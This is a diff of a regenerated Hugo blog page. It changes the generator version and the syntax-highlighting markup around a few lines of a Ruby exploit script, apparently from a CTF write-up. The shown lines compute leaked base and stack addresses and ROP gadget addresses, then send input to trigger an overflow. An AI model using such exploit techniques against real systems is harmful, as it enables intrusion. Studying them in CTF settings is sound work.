@@ -19,7 +19,7 @@
   
   <link rel="stylesheet" href="https://owlinux1000.github.io/blog/css/base.min.21688b64210142c045c9a1d930a48fc517f428060c78a3a012d71f971874c5c3.css" integrity="sha256-IWiLZCEBQsBFyaHZMKSPxRf0KAYMeKOgEtcflxh0xcM=">
   
-  <meta name="generator" content="Hugo 0.59.1" />
+  <meta name="generator" content="Hugo 0.53" />
 </head>
 <body>
   <nav class="u-background">
@@ -231,12 +231,12 @@ text_base <span style="color:#666">=</span> tmp<span style="color:#666">.</span>
 stack_addr <span style="color:#666">=</span> tmp<span style="color:#666">.</span>match(<span style="color:#b68">/at: (.*)\./</span>)<span style="color:#666">[</span><span style="color:#666">1</span><span style="color:#666">].</span>to_i(<span style="color:#666">16</span>)
 pop_ecx_ret <span style="color:#666">=</span> text_base <span style="color:#666">+</span> <span style="color:#666">0x0040178c</span>
 jmp_memory <span style="color:#666">=</span> text_base <span style="color:#666">+</span> <span style="color:#666">0x0040110d</span>
-<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;image base address        : 0x%x&#34;</span> <span style="color:#666">%</span> text_base
-<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;Stack address             : 0x%x&#34;</span> <span style="color:#666">%</span> stack_addr
-<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;pop ecx; ret              @ 0x%x&#34;</span> <span style="color:#666">%</span> pop_ecx_ret
-<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;jmp dword[0x401160+ecx*4] @ 0x%x&#34;</span> <span style="color:#666">%</span> jmp_memory
-
-<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;[*] Select V to overflow&#34;</span>
+<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;image base address        : 0x%x&#34;</span> <span style="color:#008000">% text_base
+</span><span style="color:#008000">puts </span> <span style="color:#ba2121">&#34;Stack address             : 0x%x&#34;</span> <span style="color:#008000">% stack_addr
+</span><span style="color:#008000">puts </span> <span style="color:#ba2121">&#34;pop ecx; ret              @ 0x%x&#34;</span> <span style="color:#008000">% pop_ecx_ret
+</span><span style="color:#008000">puts </span> <span style="color:#ba2121">&#34;jmp dword[0x401160+ecx*4] @ 0x%x&#34;</span> <span style="color:#008000">% jmp_memory
+</span><span style="color:#008000">
+</span><span style="color:#008000">puts </span> <span style="color:#ba2121">&#34;[*] Select V to overflow&#34;</span>
 z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;V&#34;</span>
 z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;).</span><span style="color:#b62;font-weight:bold">\n\n</span><span style="color:#ba2121">&#34;</span>
 
